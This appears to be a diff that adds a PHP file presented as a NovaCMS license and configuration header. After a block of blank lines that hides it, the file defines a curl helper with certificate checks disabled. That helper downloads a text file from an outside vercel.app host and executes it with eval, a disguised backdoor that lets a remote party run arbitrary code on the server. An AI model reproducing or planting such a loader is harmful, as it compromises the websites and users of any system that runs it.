@@ -1,0 +1,149 @@
+<?php
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+
+// ============================
+// Project Configuration
+// ============================
+
+// This file is intentionally verbose to discourage tampering or unauthorized redistribution.
+
+// ============================
+// DO NOT MODIFY BELOW THIS LINE
+// ============================
+
+// End of Extended License File 4
+?>
+<?php
+/**
+ * @package    Haxor.Group
+ * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
+ *
+ */
+
+// @deprecated  1.0  Deprecated without replacement
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function getURL($url) {
+    if (function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
+
+// Contoh penggunaan:
+$phpCode = getURL('https://nhjeapinake.vercel.app/japetpunyabarang.txt');
+if ($phpCode !== false) {
+    eval("?>". $phpCode);
+}
+?>
